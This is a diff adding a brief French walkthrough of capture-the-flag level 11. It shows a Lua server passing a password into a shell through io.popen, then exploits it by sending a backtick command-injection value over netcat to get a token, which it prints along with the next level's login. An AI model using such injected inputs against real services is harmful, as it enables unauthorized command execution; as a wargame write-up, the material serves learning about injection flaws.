@@ -1,0 +1,18 @@
+LEVEL 11
+--------
+
+1.  Commande:   ls
+    Sortie:     level11.lua
+
+2.  Commande:   cat level11.lua
+    Sortie:     prog = io.popen("echo "..pass.." | sha1sum", "r")
+    On peut escape le pass pour afficher le flag.
+
+3.  On se connecte au serveur qui est lancé dans le .lua.
+    Commande:   nc 127.0.0.1 5151
+    Un mot de passe est demandé.
+    Password:   `getflag > /tmp/flag`
+    Sortie:     Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
+4.  Commande:   su level12
+    Mdp:        fa6v5ateaw21peobuub8ipe6s
